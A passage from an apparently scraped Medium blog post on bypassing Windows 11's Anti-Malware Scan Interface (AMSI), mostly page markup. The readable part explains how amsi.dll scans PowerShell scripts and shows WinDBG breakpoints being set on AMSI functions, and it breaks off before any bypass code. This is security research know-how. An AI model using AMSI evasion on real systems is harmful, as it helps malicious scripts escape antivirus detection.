0-4.61 3.1V8.02l-7.23 2v.3h.04c1.55.14 2 .7 2 2.49v13.63h6.74v-.29h-.03c-1.15-.28-1.52-.78-1.52-2.05V11.9c.3-.71.91-1.56 2.13-1.56 1.5 0 2.26 1.05 2.26 3.12v12.97h6.75v-.29h-.03c-1.15-.28-1.52-.78-1.52-2.05V13.25a7 7 0 0 0-.1-1.21c.32-.78.97-1.7 2.23-1.7 1.53 0 2.27 1.02 2.27 3.12v12.97h7.23z" fill="#242424"></path></mask><g filter="url(#logo-wordmark-pride_svg__filter0_f_238_6555)" mask="url(#logo-wordmark-pride_svg__a)"><path d="M42.3-64.7l-15.52-6.74L-24.62 47l15.53 6.74L42.3-64.7z" fill="#000"></path><path d="M53.18-59.98L42.3-64.7-9.1 53.74l10.88 4.72 51.4-118.44z" fill="#603917"></path><path d="M64.96-54.87l-11.78-5.11L1.78 58.46l11.79 5.11 51.4-118.44z" fill="#71E2FD"></path><path d="M75.84-50.15l-10.88-4.72-51.4 118.44 10.89 4.72L75.84-50.15z" fill="#FF9BC9"></path><path d="M86.71-45.43l-10.87-4.72L24.44 68.3l10.88 4.72 51.4-118.44z" fill="#FF472F"></path><path d="M97.6-40.7L86.7-45.44 35.32 73.01l10.88 4.72L97.6-40.7z" fill="#FF8312"></path><path d="M108.47-35.99L97.6-40.7 46.2 77.73l10.88 4.72 51.4-118.44z" fill="#FFCE00"></path><path d="M120.25-30.88l-11.78-5.1-51.4 118.43 11.79 5.11 51.4-118.44z" fill="#48E348"></path><path d="M131.13-26.16l-10.88-4.72L68.86 87.56l10.88 4.72 51.4-118.44z" fill="#008EF0"></path><path d="M148.48-18.63l-17.35-7.53-51.4 118.44 17.35 7.53 51.4-118.44z" fill="#9A50FC"></path></g><defs><filter id="logo-wordmark-pride_svg__filter0_f_238_6555" x="-29.5" y="-76.33" width="182.87" height="181.03" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"><feFlood flood-opacity="0" result="BackgroundImageFix"></feFlood><feBlend in="SourceGraphic" in2="BackgroundImageFix" result="shape"></feBlend><feGaussianBlur stdDeviation="2.45" result="effect1_foregroundBlur_238_6555"></feGaussianBlur></filter></defs></svg></a><div class="au h"><div class="ab av aw ax ay q az ba"><div class="bj" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bk bl ab"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.1 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0zm6.94-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .8-.79l-3.74-3.73A8.05 8.05 0 0 0 11.04 3v.01z" fill="currentColor"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="av bb bc bd z be bf bg bh bi" placeholder="Search" value=""></div></div></div><div class="h k w fd fe"><div class="ff ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---two_column_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bc b bd z dr fg fh ab q fi fj"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" aria-label="Write"><path d="M14 4a.5.5 0 0 0 0-1v1zm7 6a.5.5 0 0 0-1 0h1zm-7-7H4v1h10V3zM3 4v16h1V4H3zm1 17h16v-1H4v1zm17-1V10h-1v10h1zm-1 1a1 1 0 0 0 1-1h-1v1zM3 20a1 1 0 0 0 1 1v-1H3zM4 3a1 1 0 0 0-1 1h1V3z" fill="currentColor"></path><path d="M17.5 4.5l-8.46 8.46a.25.25 0 0 0-.06.1l-.82 2.47c-.07.2.12.38.31.31l2.47-.82a.25.25 0 0 0 .1-.06L19.5 6.5m-2-2l2.32-2.32c.1-.1.26-.1.36 0l1.64 1.64c.1.1.1.26 0 .36L19.5 6.5m-2-2l2 2" stroke="currentColor"></path></svg><div class="dq l">Write</div></div></a></span></div></div><div class="k j i d"><div class="ff ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---two_column_layout_nav----------------------------------" rel="noopener follow"><div class="bc b bd z dr fg fh ab q fi fj"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" aria-label="Search"><path fill-rule="evenodd" clip-rule="evenodd" d="M4.1 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0zm6.94-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .8-.79l-3.74-3.73A8.05 8.05 0 0 0 11.04 3v.01z" fill="currentColor"></path></svg></div></a></div></div><div class="ff h k j"><div class="ab q"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><button class="bc b du dv ee dw dx ef dy dz eg eh eb ei ej ed ek el em eo ep eq er es et eu ev ew ex ey ez fa bj fb fc" data-testid="headerSignUpButton">Sign up</button></span></p><div class="au l"><p class="bc b du dv dw dx dy dz ea eb ec ed dr"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;source=post_page---two_column_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="av fk am ab q ao fl fm fn" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fg"><img alt="" class="l fa bv bw bx cu" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"><div class="fo bv l bw bx fp n av fq"></div></div></button></div></div></div><div class="l"><div class="rj" role="dialog" aria-modal="true" tabindex="-1"><div class="wk wl be dt tq wm tm ao wn gj wo" aria-hidden="true" role="presentation"></div><div class="wp tq wq wr ws wk dt fa wt wu wv lc ww wx tr wy wz xa xb xc xd" aria-hidden="true"></div></div><div class="fr fs ft fu fv l"><div class="ab by"><div class="cf be fw fx fy fz"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fp gf gg gh gi gj"></div><div class="gk gl gm gn go"><div class="ab by"><div class="cf be fw fx fy fz"><div><h1 id="74c3" class="pw-post-title gp gq gr bc gs gt gu gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr bh" data-testid="storyTitle" data-selectable-paragraph="">Bypass AMSI on Windows 11</h1><div class="hs ht hu hv hw"><div class="speechify-ignore ab cm"><div class="speechify-ignore be l"><div class="hx hy hz ia ib ab"><div><div class="ab ic"><a rel="noopener follow" href="/?source=post_page-----75d231b2cac6--------------------------------"><div><div class="bj" aria-hidden="false" aria-describedby="1" aria-labelledby="1"><div class="l id ie bv if ig"><div class="l fg"><img alt="Gustav Shen" class="l fa bv da db cu" src="https://miro.medium.com/v2/resize:fill:88:88/1*QVBOkkcMPzE3HYxh1TH2Sg.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"><div class="ih bv l da db fp n ii fq"></div></div></div></div></div></a></div></div><div class="bk be l"><div class="ab"><div style="flex:1"><span class="bc b bd z bh"><div class="ij ab q"><div class="ab q ik"><div class="ab q"><div><div class="bj" aria-hidden="false" aria-describedby="2" aria-labelledby="2"><p class="bc b il im bh"><a class="af ag ah ai aj ak al am an ao ap aq ar in" data-testid="authorName" rel="noopener follow" href="/?source=post_page-----75d231b2cac6--------------------------------">Gustav Shen</a></p></div></div></div><span class="io ip" aria-hidden="true"><span class="bc b bd z dr">·</span></span><p class="bc b il im dr"><span><a class="iq ir ah ai aj ak al am an ao ap aq ar eu is it" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F39cded15042e&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;user=Gustav+Shen&amp;userId=39cded15042e&amp;source=post_page-39cded15042e----75d231b2cac6---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l iu"><span class="bc b bd z dr"><div class="ab ck iv iw ix"><span class="bc b bd z dr"><div class="ab ae"><span data-testid="storyReadTime">10 min read</span><div class="iy iz l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bc b bd z dr">·</span></span></div><span data-testid="storyPublishDate">Jul 27, 2023</span></div></span></div></span></div></div></div><div class="ab cm ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp"><div class="h k w fd fe q"><div class="kf l"><div class="ab q kg kh"><div class="pw-multi-vote-icon fg ki kj kk kl"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F75d231b2cac6&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;user=Gustav+Shen&amp;userId=39cded15042e&amp;source=-----75d231b2cac6---------------------clap_footer-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="3" aria-labelledby="3"><div class="km ao kn ko kp kq am kr ks kt kl"><svg width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.37.83L12 3.28l.63-2.45h-1.26zM13.92 3.95l1.52-2.1-1.18-.4-.34 2.5zM8.59 1.84l1.52 2.11-.34-2.5-1.18.4zM18.52 18.92a4.23 4.23 0 0 1-2.62 1.33l.41-.37c2.39-2.4 2.86-4.95 1.4-7.63l-.91-1.6-.8-1.67c-.25-.56-.19-.98.21-1.29a.7.7 0 0 1 .55-.13c.28.05.54.23.72.5l2.37 4.16c.97 1.62 1.14 4.23-1.33 6.7zm-11-.44l-4.15-4.15a.83.83 0 0 1 1.17-1.17l2.16 2.16a.37.37 0 0 0 .51-.52l-2.15-2.16L3.6 11.2a.83.83 0 0 1 1.17-1.17l3.43 3.44a.36.36 0 0 0 .52 0 .36.36 0 0 0 0-.52L5.29 9.51l-.97-.97a.83.83 0 0 1 0-1.16.84.84 0 0 1 1.17 0l.97.97 3.44 3.43a.36.36 0 0 0 .51 0 .37.37 0 0 0 0-.52L6.98 7.83a.82.82 0 0 1-.18-.9.82.82 0 0 1 .76-.51c.22 0 .43.09.58.24l5.8 5.79a.37.37 0 0 0 .58-.42L13.4 9.67c-.26-.56-.2-.98.2-1.29a.7.7 0 0 1 .55-.13c.28.05.55.23.73.5l2.2 3.86c1.3 2.38.87 4.59-1.29 6.75a4.65 4.65 0 0 1-4.19 1.37 7.73 7.73 0 0 1-4.07-2.25zm3.23-12.5l2.12 2.11c-.41.5-.47 1.17-.13 1.9l.22.46-3.52-3.53a.81.81 0 0 1-.1-.36c0-.23.09-.43.24-.59a.85.85 0 0 1 1.17 0zm7.36 1.7a1.86 1.86 0 0 0-1.23-.84 1.44 1.44 0 0 0-1.12.27c-.3.24-.5.55-.58.89-.25-.25-.57-.4-.91-.47-.28-.04-.56 0-.82.1l-2.18-2.18a1.56 1.56 0 0 0-2.2 0c-.2.2-.33.44-.4.7a1.56 1.56 0 0 0-2.63.75 1.6 1.6 0 0 0-2.23-.04 1.56 1.56 0 0 0 0 2.2c-.24.1-.5.24-.72.45a1.56 1.56 0 0 0 0 2.2l.52.52a1.56 1.56 0 0 0-.75 2.61L7 19a8.46 8.46 0 0 0 4.48 2.45 5.18 5.18 0 0 0 3.36-.5 4.89 4.89 0 0 0 4.2-1.51c2.75-2.77 2.54-5.74 1.43-7.59L18.1 7.68z"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ku kv kw kx ky kz la"><div><div class="bj" aria-hidden="false" aria-describedby="60" aria-labelledby="60"><p class="bc b ds z dr"><button class="af ag ah ai aj ak al am an ao ap aq ar as at yk li">114<span class="l h g f ro rp"></span></button></p></div></div></div></div></div><div><div class="bj" aria-hidden="false" aria-describedby="4" aria-labelledby="4"><button class="ao km lc ld ab q fh le lf" aria-label="responses"><svg width="24" height="24" viewBox="0 0 24 24" class="lg"><path d="M18 16.8a7.14 7.14 0 0 0 2.24-5.32c0-4.12-3.53-7.48-8.05-7.48C7.67 4 4 7.36 4 11.48c0 4.13 3.67 7.48 8.2 7.48a8.9 8.9 0 0 0 2.38-.32c.23.2.48.39.75.56 1.06.69 2.2 1.04 3.4 1.04.22 0 .4-.11.48-.29a.5.5 0 0 0-.04-.52 6.4 6.4 0 0 1-1.16-2.65v.02zm-3.12 1.06l-.06-.22-.32.1a8 8 0 0 1-2.3.33c-4.03 0-7.3-2.96-7.3-6.59S8.17 4.9 12.2 4.9c4 0 7.1 2.96 7.1 6.6 0 1.8-.6 3.47-2.02 4.72l-.2.16v.26l.02.3a6.74 6.74 0 0 0 .88 2.4 5.27 5.27 0 0 1-2.17-.86c-.28-.17-.72-.38-.94-.59l.01-.02z"></path></svg></button></div></div></div><div class="ab q jq jr js jt ju jv jw jx jy jz ka kb kc kd ke"><div class="lh k j i d"></div><div class="h k"><div><div class="bj" aria-hidden="false" aria-describedby="5" aria-labelledby="5"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F75d231b2cac6&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;source=-----75d231b2cac6---------------------bookmark_footer-----------" rel="noopener follow"><svg width="25" height="25" viewBox="0 0 25 25" fill="none" class="dr li" aria-label="Add to list bookmark button"><path d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18V2.5zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .8.4l5.7-4.4 5.7 4.4a.5.5 0 0 0 .8-.4v-8.5a.5.5 0 0 0-1 0v7.48l-5.2-4a.5.5 0 0 0-.6 0l-5.2 4V7z" fill="currentColor"></path></svg></a></span></div></div></div><div class="fa lj ck"><div class="l ae"><div class="ab by"><div class="lk ll lm ln lo lp cf be"><div class="ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D75d231b2cac6&amp;operation=register&amp;redirect=https%3A%2F%2Fgustavshen.medium.com%2Fbypass-amsi-on-windows-11-75d231b2cac6&amp;source=-----75d231b2cac6---------------------post_audio_button-----------" rel="noopener follow"><div><div class="bj" aria-hidden="false" aria-describedby="63" aria-labelledby="63"><button aria-label="Listen" data-testid="audioPlayButton" class="af fh ah ai aj ak al lq an ao ap eu lr ls lf lt lu lv lw lx s ly lz ma mb mc md me u mf mg mh"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0zm9-10a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm3.38 10.42l-4.6 3.06a.5.5 0 0 1-.78-.41V8.93c0-.4.45-.63.78-.41l4.6 3.06c.3.2.3.64 0 .84z" fill="currentColor"></path></svg><div class="j i d"><p class="bc b bd z dr">Listen</p></div></button></div></div></a></span></div></div></div></div></div><div class="bj" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bj" aria-hidden="false" aria-describedby="7" aria-labelledby="7"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fh ah ai aj ak al lq an ao ap eu lr ls lf lt lu lv lw lx s ly lz ma mb mc md me u mf mg mh"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path fill-rule="evenodd" clip-rule="evenodd" d="M15.22 4.93a.42.42 0 0 1-.12.13h.01a.45.45 0 0 1-.29.08.52.52 0 0 1-.3-.13L12.5 3v7.07a.5.5 0 0 1-.5.5.5.5 0 0 1-.5-.5V3.02l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.8a.42.42 0 0 1 .07.5zm-.1.14zm.88 2h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11a2 2 0 0 1-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.14c.1.1.15.22.15.35a.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9V8.96c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1z" fill="currentColor"></path></svg><div class="j i d"><p class="bc b bd z dr">Share</p></div></button></div></div></div></div></div></div></div></div></div><h1 id="5e88" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Motivation</h1><p id="a5d6" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph="">In this article, I want to break down AMSI (Anti-Malware Scan Interface) and its bypass technique on Windows 11. AMSI bypass is not a new topic, and compared with bypassing EDR, AMSI bypass is much easier, but I found that one bypass approach taught in OSEP does not work on Windows 11. It interests me, as I want to know what has changed under the hood on Windows 11.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of og"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*5P_PNHqYmPYGuhMk.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*5P_PNHqYmPYGuhMk.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*5P_PNHqYmPYGuhMk.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*5P_PNHqYmPYGuhMk.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*5P_PNHqYmPYGuhMk.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*5P_PNHqYmPYGuhMk.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5P_PNHqYmPYGuhMk.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*5P_PNHqYmPYGuhMk.png 640w, https://miro.medium.com/v2/resize:fit:720/0*5P_PNHqYmPYGuhMk.png 720w, https://miro.medium.com/v2/resize:fit:750/0*5P_PNHqYmPYGuhMk.png 750w, https://miro.medium.com/v2/resize:fit:786/0*5P_PNHqYmPYGuhMk.png 786w, https://miro.medium.com/v2/resize:fit:828/0*5P_PNHqYmPYGuhMk.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*5P_PNHqYmPYGuhMk.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*5P_PNHqYmPYGuhMk.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="218" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*5P_PNHqYmPYGuhMk.png"></picture></div></div></figure><p id="64d8" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">As I am learning OSED, I also want to apply the reverse engineering skill I learned to do some personal research. Okay, let’s start.</p><h1 id="ad33" class="mi mj gr bc mk ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf bh" data-selectable-paragraph="">Background</h1><p id="427e" class="pw-post-body-paragraph ng nh gr ni b nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od gk bh" data-selectable-paragraph="">On Windows hosts, we can get a shell or C2 session by executing an exe file. Additionally, we can achieve the same goal with some script languages, such as using <strong class="ni gs">PowerShell IEX </strong>download cradle to run the script in memory without leaving files on the disk. Compared to detecting payloads on the disk, it is harder for traditional anti-virus products to detect such delivery, while AMSI provides a scanning interface to capture various script languages such as <strong class="ni gs">PowerShell</strong>, <strong class="ni gs">JScript</strong>, <strong class="ni gs">VBA</strong>, or <strong class="ni gs">C# code </strong>at run time to address the gap.</p><p id="a1df" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Amsi stands for “<strong class="ni gs">Anti-malware Scan Interface</strong>“; it targets malicious <strong class="ni gs">script-based malware</strong>. The following figure illustrates the process of how AMSI works in high level.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of ox"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*cV89qZMVc1nrX6MU.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*cV89qZMVc1nrX6MU.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*cV89qZMVc1nrX6MU.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*cV89qZMVc1nrX6MU.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*cV89qZMVc1nrX6MU.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*cV89qZMVc1nrX6MU.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*cV89qZMVc1nrX6MU.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*cV89qZMVc1nrX6MU.png 640w, https://miro.medium.com/v2/resize:fit:720/0*cV89qZMVc1nrX6MU.png 720w, https://miro.medium.com/v2/resize:fit:750/0*cV89qZMVc1nrX6MU.png 750w, https://miro.medium.com/v2/resize:fit:786/0*cV89qZMVc1nrX6MU.png 786w, https://miro.medium.com/v2/resize:fit:828/0*cV89qZMVc1nrX6MU.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*cV89qZMVc1nrX6MU.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*cV89qZMVc1nrX6MU.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="310" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*cV89qZMVc1nrX6MU.png"></picture></div></div></figure><p id="7115" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph=""><strong class="ni gs">amsi.dll</strong> is loaded to each <strong class="ni gs">powershell.exe</strong> process, providing export functions such as <strong class="ni gs">AmsiInitialize</strong>, <strong class="ni gs">AmsiOpenSession,</strong> <strong class="ni gs">AmsiScanbuffer</strong>, etc. The content of the script is passed into <strong class="ni gs">AmsiScanBuffer</strong> as an argument. Before the execution, the script will be determined if it is malicious.</p><p id="956a" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Use WinDBG to run powershell.exe; when the process is attached, we can see now amsi.dll is not loaded already.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of oy"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*9_HXIzK2ZbVyQRzi.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*9_HXIzK2ZbVyQRzi.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*9_HXIzK2ZbVyQRzi.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*9_HXIzK2ZbVyQRzi.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*9_HXIzK2ZbVyQRzi.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*9_HXIzK2ZbVyQRzi.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*9_HXIzK2ZbVyQRzi.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*9_HXIzK2ZbVyQRzi.png 640w, https://miro.medium.com/v2/resize:fit:720/0*9_HXIzK2ZbVyQRzi.png 720w, https://miro.medium.com/v2/resize:fit:750/0*9_HXIzK2ZbVyQRzi.png 750w, https://miro.medium.com/v2/resize:fit:786/0*9_HXIzK2ZbVyQRzi.png 786w, https://miro.medium.com/v2/resize:fit:828/0*9_HXIzK2ZbVyQRzi.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*9_HXIzK2ZbVyQRzi.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*9_HXIzK2ZbVyQRzi.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="100" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*9_HXIzK2ZbVyQRzi.png"></picture></div></div></figure><p id="e858" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Set unresolved breakpoints for <strong class="ni gs">AmsiInitialize</strong>, <strong class="ni gs">AmsiOpenSession</strong>, and <strong class="ni gs">AmsiScanBuffer,</strong> continue the execution. Immediately, we hit the breakpoint at the entry of function AmsiInitialize. Now amsi.dll is loaded, and the function AmsiInitialize is called.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div class="oe of oz"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*wxs9luiAkSIne5nz.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*wxs9luiAkSIne5nz.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*wxs9luiAkSIne5nz.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*wxs9luiAkSIne5nz.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*wxs9luiAkSIne5nz.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*wxs9luiAkSIne5nz.png 1100w, https://miro.medium.com/v2/resize:fit:1320/format:webp/0*wxs9luiAkSIne5nz.png 1320w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, 